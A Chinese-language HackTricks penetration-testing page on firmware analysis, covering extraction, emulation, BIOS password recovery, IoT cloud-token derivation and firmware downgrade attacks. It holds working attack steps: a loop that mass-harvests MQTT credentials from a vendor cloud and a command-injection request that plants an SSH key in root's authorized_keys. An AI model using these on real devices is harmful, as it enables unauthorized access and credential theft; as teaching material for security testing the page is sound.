# 固件分析

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **简介**

### 相关资源

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

固件是让设备正常运行的关键软件，负责管理并促进硬件组件与用户交互软件之间的通信。它存储在永久性存储器中，因此设备从通电起就能访问关键指令，进而启动操作系统。检查并可能修改固件，是识别安全漏洞的重要步骤。<sup>[[2]](#references)[[3]](#references)</sup>

## **收集信息**

**收集信息**是了解设备构成及其所用技术的关键第一步。此过程包括收集以下数据：

- CPU 架构及其运行的操作系统
- 引导加载程序的具体信息
- 硬件布局和数据手册
- 代码库指标和源代码位置
- 外部库及许可证类型
- 更新历史和法规认证
- 架构图和流程图
- 安全评估和已发现的漏洞

为此，**开源情报 (OSINT)** 工具非常有用；同时，也可以通过人工和自动化审查流程分析任何可用的开源软件组件。[Coverity Scan](https://scan.coverity.com) 和 [Semmle’s LGTM](https://lgtm.com/#explore) 等工具提供免费的静态分析，可用于发现潜在问题。

## **获取固件**

可以通过多种方式获取固件，各自的复杂程度有所不同：

- 从源头（开发者、制造商）**直接获取**
- 根据提供的说明**构建**
- 从官方支持网站**下载**
- 使用 **Google dork** 查询查找托管的固件文件
- 直接访问**云存储**，可使用 [S3Scanner](https://github.com/sa7mon/S3Scanner) 等工具
- 通过中间人技术拦截**更新**
- 通过 **UART**、**JTAG** 或 **PICit** 等连接从设备中**提取**
- **嗅探**设备通信中的更新请求
- 识别并使用**硬编码的更新端点**
- 从引导加载程序或网络中**转储**
- 如果其他方法都行不通，则使用合适的硬件工具**拆下并读取**存储芯片

### 仅有 UART 日志：通过闪存中的 U-Boot 环境变量强制启动 root shell

如果 UART RX 被忽略（只有日志），仍可通过离线**编辑 U-Boot 环境变量块**来强制启动 init shell：<sup>[[6]](#references)</sup>

1. 使用 SOIC-8 夹子和编程器（3.3V）转储 SPI flash：
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. 定位 U-Boot env 分区，编辑 `bootargs`，加入 `init=/bin/sh`，并**重新计算该 blob 的 U-Boot env CRC32**。
3. 仅重新刷写 env 分区并重启；UART 上应该会出现 shell。

这在嵌入式设备上很有用：这类设备的 bootloader shell 已禁用，但可以通过外部 flash 访问写入 env 分区。

## 分析固件

现在你**已经拿到固件**，需要提取相关信息，以便了解如何处理它。可以使用以下不同工具：

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

如果使用这些工具没有发现太多内容，请使用 `binwalk -E <bin>` 检查镜像的**熵**：如果熵较低，则它不太可能经过加密；如果熵较高，则它很可能经过加密（或以某种方式压缩）。

此外，你可以使用这些工具提取**固件中嵌入的文件**：

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

或者使用 [**binvis.io**](https://binvis.io/#/)（[代码](https://code.google.com/archive/p/binvis/)）检查文件。

### 差分 flash 分析与可恢复的 XOR 密钥存储

如果固件设置没有记录在案的存储格式，首先读取几次匹配的 flash 数据，只更改**一个**设置，再次转储完整芯片并比较偏移。使用受控值重复实验，可以将该设置与计数器和写入元数据区分开来；如果变化出现在新偏移而非原位置，则表示存储采用了仅追加或日志结构。保留已删除/已标记为墓碑的条目，因为其负载字节仍可能可以恢复。<sup>[[10]](#references)[[11]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

定位该区域后，使用 `binwalk` 等工具提取固件模块，并在 Ghidra 中逆向分析写入和验证逻辑。应通过代码确认字段边界、填充、密钥索引和密钥派生方式，而不是仅根据密文模式推断加密方案。<sup>[[10]](#references)</sup>

#### 从加密的零填充中恢复密钥

如 [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption) 中所述，已知明文可以揭示相同偏移处的密钥流字节。如果固定大小字段的零填充覆盖了循环 XOR 密钥的每个索引，那么该字段尤其容易受到攻击：加密后的填充会直接揭示这些密钥字节，因为 `0x00 XOR key_byte = key_byte`。如果覆盖了所有密钥索引，就可以从密文尾部重建密钥，并解密已填充的字节。<sup>[[10]](#references)</sup>

Dell 存在漏洞的 DVAR BIOS 密码格式就是一个具体示例：32 字节字段的第 `0` 个字节以明文存储，而第 `1..31` 个字节使用一个循环的 20 字节密钥。<sup>[[10]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

对于长度为 `L` 的密码，位置 `L..31` 在 XOR 前均为零。当 `L <= 12` 时，这些位置覆盖所有密钥索引，因此无需暴力破解即可恢复完整密钥和密码：<sup>[[10]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### 从历史记录中提取密钥

不要单独分析每条记录。DVAR 密钥近似由 `modified_md5(device_seed || variable_GUID || password[0])` 派生：device seed 和 GUID 是固定的，唯一依赖密码的输入是明文首字节。因此，每台设备最多有 256 个密钥，以相同字节开头的记录会共用一个密钥。按该字节对活动记录和已删除记录分组；一条较短的历史记录可能通过填充泄露完整密钥，从而解密自身填充不足的较长当前记录。因此，若旧密文被标记为 tombstoned 而不是擦除，轮换密码可能反而增加暴露风险。<sup>[[10]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn) 工具可定位 DVAR、验证候选记录、恢复密码，并显示原始存储字节/密钥字节。从代码仓库构建该工具，并按如下方式扫描经过验证的闪存镜像：<sup>[[11]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

对于自定义解析器，应通过记录结构、可打印字符约束、零填充检查、密钥熵以及密钥回绕时的一致性来排除误报。如果重复转储显示每次写入仅有少量位翻转，则应枚举观察到的掩码，并根据这些约束对修正结果排序；但如果字符存在歧义，应报告这些歧义字符，而不要将启发式结果说成精确恢复。<sup>[[10]](#references)</sup>

密码验证器应存储加盐、经过多次迭代的单向哈希，而不是可逆密文；采用日志结构的存储应安全移除已被取代的机密材料。<sup>[[10]](#references)</sup>

### 获取文件系统

使用前面提到的注释工具（如 `binwalk -ev <bin>`），你应该已经能够**提取文件系统**。\
Binwalk 通常会将其提取到一个**以文件系统类型命名的文件夹**中，常见类型包括：squashfs、ubifs、romfs、rootfs、jffs2、yaffs2、cramfs、initramfs。

#### 手动提取文件系统

有时，binwalk 的签名中**不包含文件系统的魔数**。在这种情况下，使用 binwalk **查找文件系统的偏移量，并从二进制文件中 carve 出压缩的文件系统**，然后按照其类型使用以下步骤**手动提取**文件系统。

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

运行以下 **dd 命令**，提取 Squashfs 文件系统。

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

或者也可以运行以下命令。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- 对于 squashfs（在上面的示例中使用）

`$ unsquashfs dir.squashfs`

之后，文件将位于 "`squashfs-root`" 目录中。

- CPIO 归档文件

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- 对于 jffs2 文件系统

`$ jefferson rootfsfile.jffs2`

- 对于使用 NAND 闪存的 ubifs 文件系统

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## 分析固件

获取固件后，必须对其进行剖析，以了解其结构和潜在漏洞。此过程涉及使用各种工具来分析固件并从固件映像中提取有价值的数据。

### 初步分析工具

以下是一组用于初步检查二进制文件（记作 `<bin>`）的命令。这些命令有助于识别文件类型、提取字符串、分析二进制数据，并了解分区和文件系统的详细信息：

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

To assess the encryption status of the image, use `binwalk -E <bin>` to check its **entropy**. Low entropy suggests a lack of encryption, while high entropy indicates possible encryption or compression.

For extracting **embedded files**, tools and resources like the **file-data-carving-recovery-tools** documentation and **binvis.io** for file inspection are recommended.

### Extracting the Filesystem

Using `binwalk -ev <bin>`, one can usually extract the filesystem, often into a directory named after the filesystem type (e.g., squashfs, ubifs). However, when **binwalk** fails to recognize the filesystem type due to missing magic bytes, manual extraction is necessary. This involves using `binwalk` to locate the filesystem's offset, followed by the `dd` command to carve out the filesystem:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

之后，根据文件系统类型（例如 squashfs、cpio、jffs2、ubifs），使用不同的命令手动提取内容。

### 文件系统分析

提取文件系统后，便开始搜索安全漏洞。重点关注不安全的网络守护进程、硬编码凭据、API 端点、更新服务器功能、未编译的代码、启动脚本，以及用于离线分析的已编译二进制文件。

需要检查的**关键位置**和**项目**包括：

- **etc/shadow** 和 **etc/passwd** 中的用户凭据
- **etc/ssl** 中的 SSL 证书和密钥
- 可能存在漏洞的配置文件和脚本文件
- 用于进一步分析的嵌入式二进制文件
- 常见 IoT 设备的 Web 服务器和二进制文件

以下工具可帮助在文件系统中发现敏感信息和漏洞：

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) 和 [**Firmwalker**](https://github.com/craigz28/firmwalker)，用于搜索敏感信息
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)，用于全面的固件分析
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) 和 [**EMBA**](https://github.com/e-m-b-a/emba)，用于静态和动态分析

### 已编译二进制文件的安全检查

必须仔细检查在文件系统中发现的源代码和已编译二进制文件，查找其中的漏洞。**checksec.sh** 等工具可用于 Unix 二进制文件，**PESecurity** 则可用于 Windows 二进制文件，帮助识别可能遭利用的、缺乏保护的二进制文件。

## 通过派生的 URL token 获取 cloud config 和 MQTT 凭据

许多 IoT hub 会从类似以下格式的 cloud endpoint 获取每台设备的配置：<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

在固件分析期间，你可能会发现 `<token>` 是在本地使用硬编码密钥根据设备 ID 派生的，例如：

- token = MD5( deviceId || STATIC_KEY )，并以大写十六进制表示

这种设计使任何获知 deviceId 和 STATIC_KEY 的人都能重建该 URL 并获取 cloud config，其中往往会暴露明文 MQTT 凭据和 topic 前缀。

实用操作流程：

1) 从 UART 启动日志中提取 deviceId

- 连接 3.3V UART 适配器（TX/RX/GND）并捕获日志：

```bash
picocom -b 115200 /dev/ttyUSB0
```

- 查找输出云配置 URL 模式和 broker 地址的行，例如：

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) 从 firmware 中恢复 STATIC_KEY 和 token 算法

- 将二进制文件载入 Ghidra/radare2，并搜索配置路径（"/pf/"）或 MD5 的使用情况。
- 确认算法（例如，MD5(deviceId||STATIC_KEY)）。
- 在 Bash 中推导 token，并将摘要转换为大写：

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) 收集 cloud config 和 MQTT 凭据

- 拼接 URL 并使用 curl 拉取 JSON；用 jq 提取 secrets：

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) 滥用明文 MQTT 和薄弱的 topic ACL（如果存在）

- 使用恢复的凭据订阅维护 topic，并查找敏感事件：

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) 枚举可预测的设备 ID（经授权后批量操作）

- 许多生态系统会嵌入厂商 OUI/产品/类型字节，并在后面附加顺序后缀。
- 你可以遍历候选 ID，以编程方式派生 token 并获取配置：

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notes
- 尝试大规模枚举前，务必获得明确授权。
- 尽可能优先使用仿真或静态分析来恢复机密，避免修改目标硬件。


仿真固件的过程可以对设备的运行情况或单个程序进行**动态分析**。这种方法可能会遇到硬件或架构依赖方面的挑战，但将根文件系统或特定二进制文件传输到架构和字节序相匹配的设备（例如 Raspberry Pi）或预先构建的虚拟机，可以便于进一步测试。

### 仿真单个二进制文件

检查单个程序时，确定程序的字节序和 CPU 架构至关重要。

#### MIPS 架构示例

要仿真 MIPS 架构的二进制文件，可以使用以下命令：

```bash
file ./squashfs-root/bin/busybox
```

并安装必要的仿真工具：

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

对于 MIPS（大端序），使用 `qemu-mips`；对于小端序二进制文件，则应选择 `qemu-mipsel`。

#### ARM 架构模拟

对于 ARM 二进制文件，流程类似，使用 `qemu-arm` emulator 进行模拟。

### 完整系统模拟

[Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) 等工具可实现完整固件模拟，自动化相关流程并辅助动态分析。

### 重建用于模拟的拆分式、经过验证的 root 文件系统

如果 SquashFS superblock 可读，但 inode、目录或 fragment table 的偏移量不可能成立，请勿立即修补 `unsquashfs`。应逆向分析早期启动二进制文件，并重现其创建的块设备图：嵌入式系统可能会暴露一个名义上的 root 分区，但通过 `dm-linear` 映射，将从另一个分区借用的扇区追加到其中，以此构建真正的文件系统。即使之后的所有元数据块都发生了偏移，仅检查 superblock 仍可能成功。<sup>[[9]](#references)</sup>

精确保留固件中的算术运算。尤其要确认长度的单位是字节、512 字节扇区还是 4 KiB 页面；按原始顺序复现移位和截断操作；并考虑 A/B 布局中随 bank 而变化的尾部区域。例如，`(partition_bytes >> 12) << 3` 会先截断到 4 KiB 边界，然后才换算为 512 字节扇区；将其替换为 `partition_bytes // 512` 可能会使追加范围偏移几千字节，并破坏所有下游 SquashFS 表。<sup>[[9]](#references)</sup>

一种实用的验证流程如下：<sup>[[9]](#references)</sup>

1. 从 verifier/init 二进制文件中恢复每个 `dm-linear` 段的源设备、起始扇区和长度。
2. 拼接或映射这些范围，且不改变其对齐语义。
3. 如果提取仍然失败，只在预测边界附近的小范围内搜索，并要求连续找到多个有效元数据结构，而不是仅凭一个看似合理的 superblock 就认定成功。
4. 使用未经修改的 `unsquashfs` 检查重建后的镜像；成功遍历所有目录和 fragments，比 `unsquashfs -stat` 更能说明问题。

#### 由分析人员控制的 dm-verity 替换

当分析人员控制 QEMU kernel、initramfs 和虚拟磁盘时，可以用一个小型静态链接 init 替换厂商的验证 PID 1，以启动修改后的 root。这是**实验环境中的启动链替换**，并非破解 dm-verity、其 RSA 签名、Secure Boot 或 TPM 封装的密钥。<sup>[[9]](#references)</sup>

替换用的 init 应复现原始启动路径中的关键操作：挂载 `devtmpfs`，调用 `setsid()`，将 `/dev/console` 连接到文件描述符 0–2，挂载 `/proc` 和 `/sys`，等待提供的块设备就绪，以只读方式挂载编辑后的 root，卸载旧 root 的伪文件系统，将新挂载点移动到 `/`，执行 `chroot`，然后 `execve()` 固件原有的 `/sbin/init`。在 `MS_MOVE` **之前**卸载 `/dev`、`/proc` 和 `/sys`，可避免误卸载属于新 root 的挂载点。<sup>[[9]](#references)</sup>

将可变设备状态与修改后的只读 root 分开。qcow2 overlay 可以保留原始磁盘的 LVM 状态，同时由第二块只读 virtio 磁盘提供编辑后的 SquashFS：<sup>[[9]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### 离线镜像状态调试

当启动缓慢、破坏性启动脚本或不可靠的控制台日志掩盖故障时，请检查客户机外部的持久化状态。切勿挂载正在被运行中 VM 使用的 overlay；使用 `qemu-nbd` 将其呈现出来，将 LVM 发现范围限制为目标 NBD 分区，并在断开连接前停用卷组。<sup>[[9]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

为实现可重复的故障隔离，请将带时间戳的标记文件写入稳定且可写的卷，并在离线状态下验证；`/dev/kmsg`、FIFO 和临时控制台可能因速率限制或进程过早退出而产生假阴性。在更改无关代码之前，也应比较各层的具体接口：`uname -r` 与 `/lib/modules/`、磁盘上的 ext4 特性与内核配置，以及 Mesa `libGL` 的版本与 DRI 驱动 ABI 和根据 PCI 信息推导出的驱动名称。某个组件可能确实存在，甚至能成功执行 `dlopen()`，但由于其使用方期望的是不同的 ABI，仍然无法使用。<sup>[[9]](#references)</sup>

## 实践中的动态分析

在此阶段，可使用真实或模拟的设备环境进行分析。必须保持对 OS 和文件系统的 shell 访问。模拟不一定能完美复现硬件交互，因此有时需要重启模拟环境。分析应重新检查文件系统，利用暴露的网页和网络服务，并探索 bootloader 漏洞。固件完整性测试对于识别潜在的 backdoor 漏洞至关重要。

## 运行时分析技术

运行时分析是在进程或二进制文件的运行环境中与其交互，并使用 gdb-multiarch、Frida 和 Ghidra 等工具设置断点，通过 fuzzing 及其他技术识别漏洞。

对于没有完整 debugger 的嵌入式目标，**将静态链接的 `gdbserver` 复制**到设备上，并远程附加：<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor 消息映射

在 IoT hub 上，RF stack 通常分布在 **radio MCU** 和 Linux 用户态进程之间。一个实用的工作流程是映射这条路径：<sup>[[8]](#references)</sup>

1. 空中的 **RF frame**
2. radio MCU 上的 **controller-side parser**
3. 转发到 Linux 的 **serial/UART text 或 TLV protocol**（例如 `/dev/tty*`）
4. 主 daemon 中的 **application dispatcher**
5. **protocol-specific handler / state machine**

这种架构会产生两个逆向分析目标，而不是一个。如果 controller 将二进制 radio frame 转换为 `Group,Command,arg1,arg2,...` 这类文本 protocol，则需要还原：

- **message group** 和 dispatch table
- 哪些消息可以来自 **network**，哪些只能来自 controller 本身
- 确切的 **manufacturer-specific discriminator field**（例如 Zigbee `manufacturer_code` 和自定义 `cluster_command`）
- 哪些 handler 只能在 **commissioning**、discovery 或 firmware/model 下载阶段触达

针对 Zigbee，捕获 pairing 流量，并检查目标是否仍依赖默认 **Link Key** `ZigBeeAlliance09`。如果是，嗅探 commissioning 流量可能会暴露 **Network Key**。Zigbee 3.0 install code 可以降低这种暴露风险，因此要记录受测设备是否确实强制要求使用 install code。

### Manufacturer-specific protocol handler 与 FSM 控制的可达性

与标准化 cluster 相比，厂商专用的 Zigbee/ZCL command 通常是更好的目标，因为它们会进入 **custom parsing code** 和内部 **FSM**，且这些代码经过充分验证的程度较低。<sup>[[8]](#references)</sup>

实用工作流程：

- 逆向分析 command dispatcher，直到找到 **vendor-only handler**。
- 还原 **FSM state**、**event**、**check**、**action** 和 **next-state** table。
- 找出会自动推进的 **transitional state**，以及最终会重置或释放攻击者可控状态的 retry/error 分支。
- 确认需要哪些合法 protocol exchange 才能让 daemon 进入易受攻击的状态，不要假设存在 bug 的 handler 始终可达。

对于对时序敏感的 protocol，使用 Python framework 重放 packet 可能太慢。更可靠的做法是使用真实硬件（例如 **nRF52840**）模拟合法设备，并搭配厂商级 stack，从而暴露正确的 **endpoint**、**attribute** 和 commissioning 时序。

### Embedded daemon 中的分片下载漏洞类型

一种常见的 firmware bug 出现在 **fragmented blob/model/configuration download** 中：<sup>[[8]](#references)</sup>

1. **第一个 fragment**（`offset == 0`）存储 `ctx->total_size`，并分配 `malloc(total_size)`。
2. 后续 fragment 只验证攻击者可控的 **packet-local** 字段，例如 `packet_total_size >= offset + chunk_len`。
3. 复制操作使用 `memcpy(&ctx->buffer[offset], chunk, chunk_len)`，却没有检查是否超出**原始分配大小**。

攻击者可以：

- 发送一个有效的第一个 fragment，并声明一个**较小**的 total size，以强制进行小型 heap allocation。
- 后续发送一个具有**预期 offset**、但 `chunk_len` 更大的 fragment。
- 伪造 packet-local size，使其通过刚执行的检查，同时仍溢出原先分配的 buffer。

如果易受攻击的路径受 commissioning logic 控制，利用时必须包含足够的 **device emulation**，以驱使目标进入预期的 model-download 或 blob-download 状态，然后再发送格式错误的 fragment。

### 由 Protocol 驱动的 `free()` 触发方式

在 embedded daemon 中，触发 heap metadata exploitation 最简单的方法往往不是“等待清理”，而是**强制触发 protocol 自身的错误处理**：<sup>[[8]](#references)</sup>

- 发送格式错误的后续 fragment，使 FSM 进入 **retry** 或 **error** 状态。
- 超过 retry threshold，使 daemon **重置 context** 并释放损坏的 buffer。
- 利用这个可预测的 `free()`，在进程因其他原因崩溃前触发 allocator 侧的 primitive。

这种方法尤其适用于 embedded Linux 中类似 **musl/uClibc/dlmalloc** 的 allocator：破坏 chunk metadata 可以将 unlink/unbin logic 转变为 write primitive。一种稳定的模式是破坏 **size field**，将 allocator traversal 引向溢出 buffer 中布置的**伪造 chunk**，而不是立即破坏真实的 bin pointer，导致进程崩溃。

## Binary Exploitation 与 Proof-of-Concept

针对已识别漏洞开发 PoC，需要深入了解目标架构，并使用更底层的语言编程。Embedded system 中的 binary runtime protection 并不常见，但如果存在，可能需要使用 Return Oriented Programming (ROP) 等技术。

### uClibc fastbin exploitation 注意事项（embedded Linux）

- **Fastbins + consolidation：**uClibc 使用的 fastbins 与 glibc 类似。之后较大的 allocation 可能触发 `__malloc_consolidate()`，因此任何伪造的 chunk 都必须通过检查（合理的 size、`fd = 0`，并且相邻 chunk 被视为“正在使用”）。<sup>[[6]](#references)</sup>
- **ASLR 下的 non-PIE binary：**如果启用了 ASLR，但主 binary 是 **non-PIE**，则 binary 内部的 `.data/.bss` 地址是稳定的。可以将目标指向一段看起来已经像有效 heap chunk header 的区域，让 fastbin allocation 落到一个 **function pointer table** 上。
- **使 parser 停止的 NUL：**解析 JSON 时，payload 中的 `\x00` 可以停止解析，同时保留后续由攻击者控制的字节，以用于 stack pivot/ROP chain。
- **通过 `/proc/self/mem` 执行 shellcode：**一个调用 `open("/proc/self/mem")`、`lseek()` 和 `write()` 的 ROP chain，可以将可执行 shellcode 写入已知 mapping 并跳转执行。

## 用于 Firmware Analysis 的预配置操作系统

[AttifyOS](https://github.com/adi0x90/attifyos) 和 [EmbedOS](https://github.com/scriptingxss/EmbedOS) 等操作系统提供预配置的环境，用于 firmware security testing，并配备所需工具。

## 用于分析 Firmware 的预配置 OS

- [**AttifyOS**](https://github.com/adi0x90/attifyos)：AttifyOS 是一种发行版，旨在帮助你对 Internet of Things (IoT) 设备执行 security assessment 和 penetration testing。它提供预配置环境并加载所有必要工具，为你节省大量时间。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS)：基于 Ubuntu 18.04 的 embedded security testing 操作系统，预装了 firmware security testing 工具。

## Firmware Downgrade Attack 与不安全的 Update Mechanism

即使厂商为 firmware image 实现了 cryptographic signature 检查，**version rollback（downgrade）保护也经常被遗漏**。如果 boot 或 recovery loader 仅使用内置的 public key 验证 signature，却不比较待刷写 image 的 *version*（或 monotonic counter），攻击者就可以合法安装**仍带有有效 signature 的旧版易受攻击 firmware**，从而重新引入已修补的漏洞。<sup>[[4]](#references)</sup>

典型攻击流程：

1. **获取较旧的签名 image**
   * 从厂商的公开下载 portal、CDN 或 support site 获取。
   * 从配套的 mobile/desktop application 中提取（例如 Android APK 中的 `assets/firmware/`）。
   * 从 VirusTotal、Internet archive、论坛等第三方 repository 获取。
2. 通过任何暴露的 update channel 将 image **上传到设备或提供给设备**：
   * Web UI、mobile-app API、USB、TFTP、MQTT 等。
   * 许多消费级 IoT 设备会暴露*未验证身份*的 HTTP(S) endpoint，接受 Base64 编码的 firmware blob，在 server 端解码并触发 recovery/upgrade。
3. downgrade 后，利用较新版中已修补的漏洞（例如后来添加的 command-injection filter）。
4. 获得 persistence 后，可以选择重新刷入最新 image 或禁用 update，以避免被发现。

### 示例：Downgrade 后的 Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

在存在漏洞的（已降级）固件中，`md5` 参数未经清理便直接拼接到 shell 命令中，因此可注入任意命令（此处用于启用基于 SSH 密钥的 root 访问）。后续固件版本加入了基本的字符过滤，但由于缺少降级保护，这项修复形同虚设。<sup>[[4]](#references)</sup>

### 从移动应用中提取固件

许多厂商会将完整固件镜像打包在配套移动应用中，以便应用通过 Bluetooth/Wi-Fi 更新设备。这些软件包通常以未加密形式存储在 APK/APEX 的 `assets/fw/` 或 `res/raw/` 等路径下。使用 `apktool`、`ghidra`，甚至普通的 `unzip`，都可以提取已签名的镜像，而无需接触实体硬件。<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot 设计中的仅限 Updater 的 anti-rollback 绕过

一些厂商确实实现了 anti-downgrade **ratchet**，但只在 *updater* 逻辑中实现（例如通过 CAN 运行的 UDS routine、recovery 命令或 userspace OTA agent）。如果 **bootloader** 后续只检查镜像签名/CRC，并信任分区表或 slot 元数据，仍然可以绕过 rollback 保护。<sup>[[7]](#references)</sup>

典型的薄弱设计：

- Firmware 元数据同时包含版本描述符和 **security ratchet** / 单调计数器。
- Updater 将镜像 ratchet 与持久化存储中的值比较，并拒绝较旧的已签名镜像。
- Bootloader **不解析**该 ratchet，只在启动选定 slot 前验证 header、CRC 和签名。
- Slot 激活状态单独存储在分区表或每个 slot 的 generation counter 中，且**没有通过密码学方式绑定**到已验证的确切 firmware digest。

这会在双 slot 系统中形成 **validate-one-image / boot-another-image** 原语。如果攻击者能让 updater 使用当前签名镜像将 slot B 标记为下次启动目标，并能在重启前覆盖 slot B，bootloader 仍可能启动降级后的镜像，因为它只信任已提交的 slot 元数据。

常见的滥用模式：

1. 将**当前的已签名** firmware 上传到被动 slot，并运行常规验证/切换流程，使布局将该 slot 标记为下一个活动 slot。
2. **暂不重启**。在同一会话中重新进入 slot 准备/擦除流程。
3. 利用过时的 boot-state 或 slot 选择逻辑，使 updater 擦除**刚刚提升的同一个物理 slot**。
4. 将**较旧但仍已签名**的 firmware 写入该 slot。
5. 跳过执行 ratchet 检查的验证流程，直接重启。
6. Bootloader 选择已提升的 slot，只验证签名/完整性，然后启动旧镜像。

逆向分析 A/B update 实现时的检查要点：

- Slot 选择由**启动时标志**推导，而这些标志在成功切换后没有刷新。
- 类似 `prepare_passive_slot()` 的 routine 根据过时状态擦除 slot，而不是依据**当前已提交的布局**。
- 类似 `part_write_layout()` 的函数只递增 **generation counter** / 设置活动标志，却不存储已验证镜像的 hash。
- Ratchet 检查在 userspace 或 updater 代码中实现，但 **ROM / bootloader / secure boot 阶段中没有实现**。
- 擦除或恢复流程移除并重写 slot 内容后，仍将其标记为可启动。

### Update 逻辑评估清单

* *Update endpoint* 的传输/身份验证是否受到充分保护（TLS + authentication）？
* 设备在刷写前是否会比较**版本号**或**单调 anti-rollback 计数器**？
* 镜像是否在 secure boot chain 内验证（例如由 ROM 代码检查签名）？
* **Bootloader 是否执行与 updater 相同的 ratchet**，而不是只检查签名/CRC？
